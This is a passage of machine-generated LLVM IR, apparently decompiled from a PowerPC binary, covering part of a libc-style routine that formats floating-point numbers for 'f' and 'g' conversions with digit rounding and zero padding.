  store i32 %v1_1000ea4c, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000ea5c

dec_label_pc_1000ea54:                            ; preds = %dec_label_pc_1000ea3c
  %v1_1000ea54 = icmp slt i32 %v0_1000ea54, 102
  %v3_1000ea54 = icmp eq i32 %v0_1000ea54, 102
  store i1 %v1_1000ea54, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000ea54, i1* %cr7_eq.global-to-local, align 1
  %v0_1000ea64 = load i32, i32* %r30.global-to-local, align 4
  br i1 %v3_1000ea54, label %dec_label_pc_1000ea64, label %dec_label_pc_1000ea5c

dec_label_pc_1000ea5c:                            ; preds = %dec_label_pc_1000ea54, %dec_label_pc_1000ea44, %dec_label_pc_1000ea4c
  %v0_1000ea5c = phi i32 [ 0, %dec_label_pc_1000ea44 ], [ %v1_1000ea4c, %dec_label_pc_1000ea4c ], [ %v0_1000ea64, %dec_label_pc_1000ea54 ]
  store i32 %v0_1000ea5c, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000ea88

dec_label_pc_1000ea64:                            ; preds = %dec_label_pc_1000ea54
  %v1_1000ea64 = load i32, i32* %r4.global-to-local, align 4
  %v2_1000ea64 = add i32 %v1_1000ea64, %v0_1000ea64
  store i32 %v2_1000ea64, i32* %r10.global-to-local, align 4
  %v1_1000ea68 = icmp slt i32 %v2_1000ea64, -1
  %v3_1000ea68 = icmp eq i32 %v2_1000ea64, -1
  store i1 %v1_1000ea68, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000ea68, i1* %cr7_eq.global-to-local, align 1
  %tmp77 = icmp sgt i32 %v2_1000ea64, -2
  br i1 %tmp77, label %dec_label_pc_1000ea88, label %dec_label_pc_1000ea70

dec_label_pc_1000ea70:                            ; preds = %dec_label_pc_1000ea64
  store i32 48, i32* %r4.global-to-local, align 4
  %v2_1000ea74 = ptrtoint i32* %stack_var_-178 to i32
  store i32 %v2_1000ea74, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r5.global-to-local, align 4
  store i32 268495488, i32* @lr, align 4
  %v3_1000ea7c = call i32 @__GI_memset(i32 %v2_1000ea74, i32 48, i32 17)
  store i32 %v3_1000ea7c, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000ea88

dec_label_pc_1000ea88:                            ; preds = %dec_label_pc_1000ea64, %dec_label_pc_1000ea5c, %dec_label_pc_1000ea70
  %v1_1000eaac = phi i32 [ %v2_1000ea64, %dec_label_pc_1000ea64 ], [ %v0_1000ea5c, %dec_label_pc_1000ea5c ], [ -1, %dec_label_pc_1000ea70 ]
  %v1_1000ea88 = icmp slt i32 %v1_1000eaac, 16
  %v2_1000ea88 = icmp sgt i32 %v1_1000eaac, 16
  %v3_1000ea88 = icmp eq i32 %v1_1000eaac, 16
  store i1 %v1_1000ea88, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000ea88, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %stack_var_-178, align 4
  store i32 48, i32* %r0.global-to-local, align 4
  store i32 48, i32* %stack_var_-177, align 4
  %v2_1000ea9c = ptrtoint i32* %stack_var_-159 to i32
  store i32 %v2_1000ea9c, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br i1 %v2_1000ea88, label %dec_label_pc_1000eac4, label %dec_label_pc_1000eaa8

dec_label_pc_1000eaa8:                            ; preds = %dec_label_pc_1000ea88
  %v2_1000eaa8 = ptrtoint i32* %stack_var_-177 to i32
  %v2_1000eaac = add i32 %v1_1000eaac, %v2_1000eaa8
  store i32 %v2_1000eaac, i32* %r9.global-to-local, align 4
  %v1_1000eab0 = add i32 %v2_1000eaac, 2
  %v2_1000eab0 = inttoptr i32 %v1_1000eab0 to i8*
  %v3_1000eab0 = load i8, i8* %v2_1000eab0, align 1
  %v4_1000eab0 = zext i8 %v3_1000eab0 to i32
  store i32 %v4_1000eab0, i32* %r0.global-to-local, align 4
  store i32 %v1_1000eab0, i32* %r11.global-to-local, align 4
  %v1_1000eab8 = sub nsw i32 52, %v4_1000eab0
  %v2_1000eab8 = sub nuw nsw i32 -1, %v4_1000eab0
  %not.v5_1000eab8 = icmp ugt i32 %v1_1000eab8, %v2_1000eab8
  %v1_1000eac0 = zext i1 %not.v5_1000eab8 to i32
  store i32 %v1_1000eac0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000eac4

dec_label_pc_1000eac4:                            ; preds = %dec_label_pc_1000ea88, %dec_label_pc_1000eaa8, %dec_label_pc_1000eac4.backedge
  %v0_1000eac8 = phi i32 [ %v0_1000eac8.pre, %dec_label_pc_1000eac4.backedge ], [ 0, %dec_label_pc_1000ea88 ], [ %v1_1000eac0, %dec_label_pc_1000eaa8 ]
  %v0_1000eac4 = phi i32 [ %v0_1000eac4.pre, %dec_label_pc_1000eac4.backedge ], [ %v2_1000ea9c, %dec_label_pc_1000ea88 ], [ %v1_1000eab0, %dec_label_pc_1000eaa8 ]
  %v1_1000eac4 = add i32 %v0_1000eac4, -1
  %v2_1000eac4 = inttoptr i32 %v1_1000eac4 to i8*
  %v3_1000eac4 = load i8, i8* %v2_1000eac4, align 1
  %v4_1000eac4 = zext i8 %v3_1000eac4 to i32
  store i32 %v1_1000eac4, i32* %r11.global-to-local, align 4
  %v2_1000eac8 = add i32 %v4_1000eac4, %v0_1000eac8
  store i32 %v2_1000eac8, i32* %r0.global-to-local, align 4
  %v1_1000eacc = urem i32 %v2_1000eac8, 256
  store i32 %v1_1000eacc, i32* %r9.global-to-local, align 4
  %v1_1000ead0 = trunc i32 %v2_1000eac8 to i8
  store i8 %v1_1000ead0, i8* %v2_1000eac4, align 1
  %v0_1000ead4 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000ead4 = icmp slt i32 %v0_1000ead4, 48
  %v3_1000ead4 = icmp eq i32 %v0_1000ead4, 48
  store i1 %v1_1000ead4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000ead4, i1* %cr7_eq.global-to-local, align 1
  %v1_1000ead8 = icmp ult i32 %v0_1000ead4, 57
  %v2_1000ead8 = icmp ugt i32 %v0_1000ead4, 57
  %v3_1000ead8 = icmp eq i32 %v0_1000ead4, 57
  store i1 %v1_1000ead8, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_1000ead8, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_1000ead8, i1* %cr6_eq.global-to-local, align 1
  %brmerge = or i1 %v3_1000ead4, %v2_1000ead8
  br i1 %brmerge, label %dec_label_pc_1000eac4.backedge, label %dec_label_pc_1000eae4

dec_label_pc_1000eac4.backedge:                   ; preds = %dec_label_pc_1000eac4
  %v0_1000eac4.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_1000eac8.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000eac4

dec_label_pc_1000eae4:                            ; preds = %dec_label_pc_1000eac4
  %v2_1000eae4 = ptrtoint i32* %stack_var_-177 to i32
  store i32 %v2_1000eae4, i32* %r0.global-to-local, align 4
  %v0_1000eae8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1000eae8, i32* @r7, align 4
  %v0_1000eaec = load i32, i32* %r11.global-to-local, align 4
  %v2_1000eaec = icmp ult i32 %v0_1000eaec, %v2_1000eae4
  %v3_1000eaec = icmp ugt i32 %v0_1000eaec, %v2_1000eae4
  %v4_1000eaec = icmp eq i32 %v0_1000eaec, %v2_1000eae4
  store i1 %v2_1000eaec, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000eaec, i1* %cr7_eq.global-to-local, align 1
  store i32 %v2_1000e978, i32* %r8.global-to-local, align 4
  br i1 %v3_1000eaec, label %dec_label_pc_1000eb04, label %dec_label_pc_1000eaf8

dec_label_pc_1000eaf8:                            ; preds = %dec_label_pc_1000eae4
  store i32 %v2_1000eae4, i32* %r8.global-to-local, align 4
  %v1_1000eafc = add i32 %v0_1000eae8, 1
  store i32 %v1_1000eafc, i32* @r7, align 4
  store i32 %v2_1000eae4, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000eb04

dec_label_pc_1000eb04:                            ; preds = %dec_label_pc_1000eae4, %dec_label_pc_1000eaf8
  %v2_1000eb0c = phi i32 [ %v0_1000eaec, %dec_label_pc_1000eae4 ], [ %v2_1000eae4, %dec_label_pc_1000eaf8 ]
  %v0_1000eb04 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000eb04 = icmp slt i32 %v0_1000eb04, 103
  %v3_1000eb04 = icmp eq i32 %v0_1000eb04, 103
  store i1 %v1_1000eb04, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000eb04, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_1000eb0c = add i32 %v2_1000eb0c, 1
  %v4_1000eb0c = inttoptr i32 %v3_1000eb0c to i8*
  store i8 0, i8* %v4_1000eb0c, align 1
  %v0_1000eb10 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000eb10 = add i32 %v0_1000eb10, 1
  store i32 %v1_1000eb10, i32* %r9.global-to-local, align 4
  %v0_1000eb14 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000eb14, label %dec_label_pc_1000eb18, label %dec_label_pc_1000eb3c

dec_label_pc_1000eb18:                            ; preds = %dec_label_pc_1000eb04
  %v0_1000eb18 = load i32, i32* @r7, align 4
  %v1_1000eb18 = icmp slt i32 %v0_1000eb18, -4
  %v3_1000eb18 = icmp eq i32 %v0_1000eb18, -4
  store i1 %v1_1000eb18, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000eb18, i1* %cr7_eq.global-to-local, align 1
  br i1 %v1_1000eb18, label %dec_label_pc_1000eb34, label %dec_label_pc_1000eb20

dec_label_pc_1000eb20:                            ; preds = %dec_label_pc_1000eb18
  %v1_1000eb20 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000eb20 = icmp sgt i32 %v1_1000eb20, %v0_1000eb18
  %v3_1000eb20 = icmp slt i32 %v1_1000eb20, %v0_1000eb18
  %v4_1000eb20 = icmp eq i32 %v1_1000eb20, %v0_1000eb18
  store i1 %v2_1000eb20, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000eb20, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000eb20, label %dec_label_pc_1000eb34, label %dec_label_pc_1000eb28

dec_label_pc_1000eb28:                            ; preds = %dec_label_pc_1000eb20
  %v2_1000eb28 = sub i32 %v1_1000eb20, %v0_1000eb18
  store i32 %v2_1000eb28, i32* %r30.global-to-local, align 4
  store i32 102, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000eb54

dec_label_pc_1000eb34:                            ; preds = %dec_label_pc_1000eb20, %dec_label_pc_1000eb18
  store i32 103, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000eb48

dec_label_pc_1000eb3c:                            ; preds = %dec_label_pc_1000eb04
  %v0_1000eb3c = load i32, i32* %r31.global-to-local, align 4
  %v1_1000eb3c = icmp slt i32 %v0_1000eb3c, 102
  %v3_1000eb3c = icmp eq i32 %v0_1000eb3c, 102
  store i1 %v1_1000eb3c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000eb3c, i1* %cr7_eq.global-to-local, align 1
  store i32 %v0_1000eb3c, i32* %r4.global-to-local, align 4
  br i1 %v3_1000eb3c, label %dec_label_pc_1000eb54thread-pre-split, label %dec_label_pc_1000eb48

dec_label_pc_1000eb48:                            ; preds = %dec_label_pc_1000eb3c, %dec_label_pc_1000eb34
  store i32 0, i32* %r10.global-to-local, align 4
  store i1 false, i1* %cr6_lt.global-to-local, align 1
  store i1 false, i1* %cr6_gt.global-to-local, align 1
  store i1 true, i1* %cr6_eq.global-to-local, align 1
  br label %dec_label_pc_1000eb68

dec_label_pc_1000eb54thread-pre-split:            ; preds = %dec_label_pc_1000eb3c
  %v0_1000eb54.pr = load i32, i32* @r7, align 4
  br label %dec_label_pc_1000eb54

dec_label_pc_1000eb54:                            ; preds = %dec_label_pc_1000eb54thread-pre-split, %dec_label_pc_1000eb28
  %v0_1000eb58 = phi i32 [ %v0_1000eb54.pr, %dec_label_pc_1000eb54thread-pre-split ], [ %v0_1000eb18, %dec_label_pc_1000eb28 ]
  %v1_1000eb54 = icmp slt i32 %v0_1000eb58, 0
  %v2_1000eb54 = icmp sgt i32 %v0_1000eb58, 0
  %v3_1000eb54 = icmp eq i32 %v0_1000eb58, 0
  store i1 %v1_1000eb54, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_1000eb54, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_1000eb54, i1* %cr6_eq.global-to-local, align 1
  store i32 %v0_1000eb58, i32* %r10.global-to-local, align 4
  %tmp78 = icmp sgt i32 %v0_1000eb58, -1
  br i1 %tmp78, label %dec_label_pc_1000eb68, label %dec_label_pc_1000eb60

dec_label_pc_1000eb60:                            ; preds = %dec_label_pc_1000eb54
  store i32 48, i32* %r0.global-to-local, align 4
  %v2_1000eb64 = load i32, i32* %r8.global-to-local, align 4
  %v3_1000eb64 = add i32 %v2_1000eb64, -1
  %v4_1000eb64 = inttoptr i32 %v3_1000eb64 to i8*
  store i8 48, i8* %v4_1000eb64, align 1
  store i32 %v3_1000eb64, i32* %r8.global-to-local, align 4
  %v1_1000eb84.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_1000eb98.pre = load i1, i1* %cr6_lt.global-to-local, align 1
  br label %dec_label_pc_1000eb68

dec_label_pc_1000eb68:                            ; preds = %dec_label_pc_1000eb54, %dec_label_pc_1000eb48, %dec_label_pc_1000eb60
  %v0_1000eb98 = phi i1 [ %v1_1000eb54, %dec_label_pc_1000eb54 ], [ false, %dec_label_pc_1000eb48 ], [ %v0_1000eb98.pre, %dec_label_pc_1000eb60 ]
  %v1_1000eb84 = phi i32 [ %v1_1000eb10, %dec_label_pc_1000eb54 ], [ %v1_1000eb10, %dec_label_pc_1000eb48 ], [ %v1_1000eb84.pre, %dec_label_pc_1000eb60 ]
  store i32 176, i32* %r5.global-to-local, align 4
  store i32 1, i32* %stack_var_-140, align 4
  %v2_1000eb74 = ptrtoint i32* %stack_var_-196 to i32
  store i32 %v2_1000eb74, i32* %r0.global-to-local, align 4
  %v0_1000eb7c = load i32, i32* %r8.global-to-local, align 4
  %v1_1000eb7c = add i32 %v0_1000eb7c, 1
  store i32 %v1_1000eb7c, i32* %r6.global-to-local, align 4
  %v2_1000eb84 = sub i32 %v1_1000eb84, %v1_1000eb7c
  store i32 %v2_1000eb84, i32* %r11.global-to-local, align 4
  %v1_1000eb88 = inttoptr i32 %v0_1000eb7c to i8*
  %v2_1000eb88 = load i8, i8* %v1_1000eb88, align 1
  %v3_1000eb88 = zext i8 %v2_1000eb88 to i32
  store i32 %v3_1000eb88, i32* %stack_var_-196, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v0_1000eb98, label %dec_label_pc_1000ebf8, label %dec_label_pc_1000eb9c

dec_label_pc_1000eb9c:                            ; preds = %dec_label_pc_1000eb68
  %v0_1000eb9c = load i32, i32* %r10.global-to-local, align 4
  %v2_1000eb9c = icmp slt i32 %v0_1000eb9c, %v2_1000eb84
  %v4_1000eb9c = icmp eq i32 %v0_1000eb9c, %v2_1000eb84
  store i1 %v2_1000eb9c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000eb9c, i1* %cr7_eq.global-to-local, align 1
  store i32 112, i32* %r0.global-to-local, align 4
  store i32 112, i32* %stack_var_-132, align 4
  br i1 %v2_1000eb9c, label %dec_label_pc_1000ebf0, label %dec_label_pc_1000ebb0

dec_label_pc_1000ebb0:                            ; preds = %dec_label_pc_1000eb9c
  %v2_1000ebb0 = sub i32 %v0_1000eb9c, %v2_1000eb84
  store i32 %v2_1000ebb0, i32* %r0.global-to-local, align 4
  %v4_1000ebb0 = icmp sgt i32 %v2_1000ebb0, 0
  store i32 -1, i32* %r10.global-to-local, align 4
  br i1 %v4_1000ebb0, label %dec_label_pc_1000ebcc, label %dec_label_pc_1000ebbc

dec_label_pc_1000ebbc:                            ; preds = %dec_label_pc_1000ebb0
  %v2_1000ebc0 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_1000ebc0, i32* @r8, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000ec14

dec_label_pc_1000ebcc:                            ; preds = %dec_label_pc_1000ebb0
  store i32 ptrtoint (i32* @global_var_10017283.382 to i32), i32* %r9.global-to-local, align 4
  %v2_1000ebd8 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %v2_1000ebd8, i32* @r8, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 176, i32* %stack_var_-120, align 4
  br label %dec_label_pc_1000ec14

dec_label_pc_1000ebf0:                            ; preds = %dec_label_pc_1000eb9c
  %v0_1000ebf0 = load i1, i1* %cr6_gt.global-to-local, align 1
  br i1 %v0_1000ebf0, label %dec_label_pc_1000ec00, label %dec_label_pc_1000ebf4

dec_label_pc_1000ebf4:                            ; preds = %dec_label_pc_1000ebf0
  store i32 -1, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000ebf8

dec_label_pc_1000ebf8:                            ; preds = %dec_label_pc_1000eb68, %dec_label_pc_1000ebf4
  %v2_1000ebf8 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_1000ebf8, i32* @r8, align 4
  br label %dec_label_pc_1000ec14

dec_label_pc_1000ec00:                            ; preds = %dec_label_pc_1000ebf0
  %v2_1000ec00 = sub i32 %v2_1000eb84, %v0_1000eb9c
  store i32 %v2_1000ec00, i32* %r11.global-to-local, align 4
  %v2_1000ec08 = add i32 %v0_1000eb9c, %v1_1000eb7c
  store i32 %v2_1000ec08, i32* %r6.global-to-local, align 4
  %v2_1000ec0c = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_1000ec0c, i32* @r8, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000ec14

dec_label_pc_1000ec14:                            ; preds = %dec_label_pc_1000ebf8, %dec_label_pc_1000ebcc, %dec_label_pc_1000ebbc, %dec_label_pc_1000ec00
  %v1_1000ec40 = phi i32 [ %v2_1000ebf8, %dec_label_pc_1000ebf8 ], [ %v2_1000ebd8, %dec_label_pc_1000ebcc ], [ %v2_1000ebc0, %dec_label_pc_1000ebbc ], [ %v2_1000ec0c, %dec_label_pc_1000ec00 ]
  %v0_1000ec20 = phi i32 [ %v2_1000eb84, %dec_label_pc_1000ebf8 ], [ 0, %dec_label_pc_1000ebcc ], [ 0, %dec_label_pc_1000ebbc ], [ %v2_1000ec00, %dec_label_pc_1000ec00 ]
  %v3_1000ec14 = load i32, i32* %v2_1000e7e4, align 4
  store i32 %v3_1000ec14, i32* %r0.global-to-local, align 4
  %v1_1000ec18 = and i32 %v3_1000ec14, 16
  store i32 %v1_1000ec18, i32* %r9.global-to-local, align 4
  %v3_1000ec18 = icmp eq i32 %v1_1000ec18, 0
  br i1 %v3_1000ec18, label %dec_label_pc_1000ec20, label %dec_label_pc_1000ec38

dec_label_pc_1000ec20:                            ; preds = %dec_label_pc_1000ec14
  %v1_1000ec20 = icmp slt i32 %v0_1000ec20, 0
  %v3_1000ec20 = icmp eq i32 %v0_1000ec20, 0
  store i1 %v1_1000ec20, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000ec20, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000ec20, label %dec_label_pc_1000ec28, label %dec_label_pc_1000ec38

dec_label_pc_1000ec28:                            ; preds = %dec_label_pc_1000ec20
  %v0_1000ec28 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000ec28 = icmp slt i32 %v0_1000ec28, 103
  %v3_1000ec28 = icmp eq i32 %v0_1000ec28, 103
  store i1 %v1_1000ec28, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000ec28, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000ec28, label %dec_label_pc_1000ec58, label %dec_label_pc_1000ec30

dec_label_pc_1000ec30:                            ; preds = %dec_label_pc_1000ec28
  %v0_1000ec30 = load i32, i32* %r30.global-to-local, align 4
  %v1_1000ec30 = icmp slt i32 %v0_1000ec30, 0
  %v3_1000ec30 = icmp eq i32 %v0_1000ec30, 0
  store i1 %v1_1000ec30, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000ec30, i1* %cr7_eq.global-to-local, align 1
  %tmp79 = icmp slt i32 %v0_1000ec30, 1
  br i1 %tmp79, label %dec_label_pc_1000ec58, label %dec_label_pc_1000ec38

dec_label_pc_1000ec38:                            ; preds = %dec_label_pc_1000ec20, %dec_label_pc_1000ec14, %dec_label_pc_1000ec30
  %v2_1000ec40 = inttoptr i32 %v1_1000ec40 to i32*
  store i32 112, i32* %v2_1000ec40, align 4
  store i32 ptrtoint (i32* @global_var_10017290.383 to i32), i32* %r9.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1000ec4c = load i32, i32* @r8, align 4
  %v2_1000ec4c = add i32 %v1_1000ec4c, 8
  %v3_1000ec4c = inttoptr i32 %v2_1000ec4c to i32*
  store i32 ptrtoint (i32* @global_var_10017290.383 to i32), i32* %v3_1000ec4c, align 4
  %v0_1000ec50 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000ec50 = load i32, i32* @r8, align 4
  %v2_1000ec50 = add i32 %v1_1000ec50, 4
  %v3_1000ec50 = inttoptr i32 %v2_1000ec50 to i32*
  store i32 %v0_1000ec50, i32* %v3_1000ec50, align 4
  %v0_1000ec54 = load i32, i32* @r8, align 4
  %v1_1000ec54 = add i32 %v0_1000ec54, 12
  store i32 %v1_1000ec54, i32* @r8, align 4
  br label %dec_label_pc_1000ec58

dec_label_pc_1000ec58:                            ; preds = %dec_label_pc_1000ec30, %dec_label_pc_1000ec28, %dec_label_pc_1000ec38
  %v1_1000ec68 = phi i32 [ %v1_1000ec40, %dec_label_pc_1000ec30 ], [ %v1_1000ec40, %dec_label_pc_1000ec28 ], [ %v1_1000ec54, %dec_label_pc_1000ec38 ]
  %v0_1000ec58 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000ec58 = add i32 %v0_1000ec58, 1
  store i32 %v1_1000ec58, i32* %r10.global-to-local, align 4
  %v4_1000ec58 = icmp eq i32 %v1_1000ec58, 0
  br i1 %v4_1000ec58, label %dec_label_pc_1000ec80, label %dec_label_pc_1000ec60

dec_label_pc_1000ec60:                            ; preds = %dec_label_pc_1000ec58
  %v1_1000ec60 = sub i32 -1, %v0_1000ec58
  store i32 176, i32* %r0.global-to-local, align 4
  %v2_1000ec68 = add i32 %v1_1000ec68, 4
  %v3_1000ec68 = inttoptr i32 %v2_1000ec68 to i32*
  store i32 %v1_1000ec60, i32* %v3_1000ec68, align 4
  store i32 ptrtoint (i32* @global_var_10017283.382 to i32), i32* %r9.global-to-local, align 4
  %v0_1000ec74 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000ec74 = load i32, i32* @r8, align 4
  %v2_1000ec74 = inttoptr i32 %v1_1000ec74 to i32*
  store i32 %v0_1000ec74, i32* %v2_1000ec74, align 4
  %v0_1000ec78 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000ec78 = load i32, i32* @r8, align 4
  %v2_1000ec78 = add i32 %v1_1000ec78, 8
  %v3_1000ec78 = inttoptr i32 %v2_1000ec78 to i32*
  store i32 %v0_1000ec78, i32* %v3_1000ec78, align 4
  %v0_1000ec7c = load i32, i32* @r8, align 4
  %v1_1000ec7c = add i32 %v0_1000ec7c, 12
  store i32 %v1_1000ec7c, i32* @r8, align 4
  br label %dec_label_pc_1000ec80

dec_label_pc_1000ec80:                            ; preds = %dec_label_pc_1000ec58, %dec_label_pc_1000ec60
  %v1_1000ec8c = phi i32 [ %v1_1000ec68, %dec_label_pc_1000ec58 ], [ %v1_1000ec7c, %dec_label_pc_1000ec60 ]
  %v0_1000ec80 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000ec80 = icmp slt i32 %v0_1000ec80, 0
  %v3_1000ec80 = icmp eq i32 %v0_1000ec80, 0
  store i1 %v1_1000ec80, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000ec80, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000ec80, label %dec_label_pc_1000ec9c, label %dec_label_pc_1000ec88

dec_label_pc_1000ec88:                            ; preds = %dec_label_pc_1000ec80
  store i32 112, i32* %r0.global-to-local, align 4
  %v0_1000ec8c = load i32, i32* %r6.global-to-local, align 4
  %v2_1000ec8c = add i32 %v1_1000ec8c, 8
  %v3_1000ec8c = inttoptr i32 %v2_1000ec8c to i32*
  store i32 %v0_1000ec8c, i32* %v3_1000ec8c, align 4
  %v0_1000ec90 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000ec90 = load i32, i32* @r8, align 4
  %v2_1000ec90 = inttoptr i32 %v1_1000ec90 to i32*
  store i32 %v0_1000ec90, i32* %v2_1000ec90, align 4
  %v0_1000ec94 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000ec94 = load i32, i32* @r8, align 4
  %v2_1000ec94 = add i32 %v1_1000ec94, 4
  %v3_1000ec94 = inttoptr i32 %v2_1000ec94 to i32*
  store i32 %v0_1000ec94, i32* %v3_1000ec94, align 4
  %v0_1000ec98 = load i32, i32* @r8, align 4
  %v1_1000ec98 = add i32 %v0_1000ec98, 12
  store i32 %v1_1000ec98, i32* @r8, align 4
  br label %dec_label_pc_1000ec9c

dec_label_pc_1000ec9c:                            ; preds = %dec_label_pc_1000ec80, %dec_label_pc_1000ec88
  %v1_1000ecc4 = phi i32 [ %v1_1000ec8c, %dec_label_pc_1000ec80 ], [ %v1_1000ec98, %dec_label_pc_1000ec88 ]
  %v0_1000ec9c = load i32, i32* %r31.global-to-local, align 4
  %v1_1000ec9c = icmp slt i32 %v0_1000ec9c, 103
  %v3_1000ec9c = icmp eq i32 %v0_1000ec9c, 103
  store i1 %v1_1000ec9c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000ec9c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000ec9c, label %dec_label_pc_1000eca4, label %dec_label_pc_1000ecb0

dec_label_pc_1000eca4:                            ; preds = %dec_label_pc_1000ec9c
  %v3_1000eca4 = load i32, i32* %v2_1000e7e4, align 4
  store i32 %v3_1000eca4, i32* %r0.global-to-local, align 4
  %v1_1000eca8 = and i32 %v3_1000eca4, 16
  store i32 %v1_1000eca8, i32* %r9.global-to-local, align 4
  %v3_1000eca8 = icmp eq i32 %v1_1000eca8, 0
  br i1 %v3_1000eca8, label %dec_label_pc_1000ecdc, label %dec_label_pc_1000ecb0

dec_label_pc_1000ecb0:                            ; preds = %dec_label_pc_1000ec9c, %dec_label_pc_1000eca4
  %v0_1000ecb0 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000ecb0 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000ecb0 = sub i32 %v1_1000ecb0, %v0_1000ecb0
  store i32 %v2_1000ecb0, i32* %r9.global-to-local, align 4
  %v1_1000ecb4 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000ecb4 = icmp sgt i32 %v1_1000ecb4, %v2_1000ecb0
  %v4_1000ecb4 = icmp eq i32 %v1_1000ecb4, %v2_1000ecb0
  store i1 %v2_1000ecb4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000ecb4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000ecb4, label %dec_label_pc_1000ecbc, label %dec_label_pc_1000ecdc

dec_label_pc_1000ecbc:                            ; preds = %dec_label_pc_1000ecb0
  %v2_1000ecbc = sub i32 %v1_1000ecb4, %v2_1000ecb0
  store i32 176, i32* %r0.global-to-local, align 4
  %v2_1000ecc4 = add i32 %v1_1000ecc4, 4
  %v3_1000ecc4 = inttoptr i32 %v2_1000ecc4 to i32*
  store i32 %v2_1000ecbc, i32* %v3_1000ecc4, align 4
  store i32 ptrtoint (i32* @global_var_10017283.382 to i32), i32* %r9.global-to-local, align 4
  %v0_1000ecd0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000ecd0 = load i32, i32* @r8, align 4
  %v2_1000ecd0 = inttoptr i32 %v1_1000ecd0 to i32*
  store i32 %v0_1000ecd0, i32* %v2_1000ecd0, align 4
  %v0_1000ecd4 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000ecd4 = load i32, i32* @r8, align 4
  %v2_1000ecd4 = add i32 %v1_1000ecd4, 8
  %v3_1000ecd4 = inttoptr i32 %v2_1000ecd4 to i32*
  store i32 %v0_1000ecd4, i32* %v3_1000ecd4, align 4
  %v0_1000ecd8 = load i32, i32* @r8, align 4
  %v1_1000ecd8 = add i32 %v0_1000ecd8, 12
  store i32 %v1_1000ecd8, i32* @r8, align 4
  br label %dec_label_pc_1000ecdc

dec_label_pc_1000ecdc:                            ; preds = %dec_label_pc_1000ecb0, %dec_label_pc_1000eca4, %dec_label_pc_1000ecbc
  %v1_1000ed7037 = phi i32 [ %v1_1000ecc4, %dec_label_pc_1000ecb0 ], [ %v1_1000ecc4, %dec_label_pc_1000eca4 ], [ %v1_1000ecd8, %dec_label_pc_1000ecbc ]
  %v0_1000ecdc = load i32, i32* %r4.global-to-local, align 4
  %v1_1000ecdc = icmp slt i32 %v0_1000ecdc, 102
  %v3_1000ecdc = icmp eq i32 %v0_1000ecdc, 102
  store i1 %v1_1000ecdc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000ecdc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000ecdc, label %dec_label_pc_1000ed64, label %dec_label_pc_1000ece4

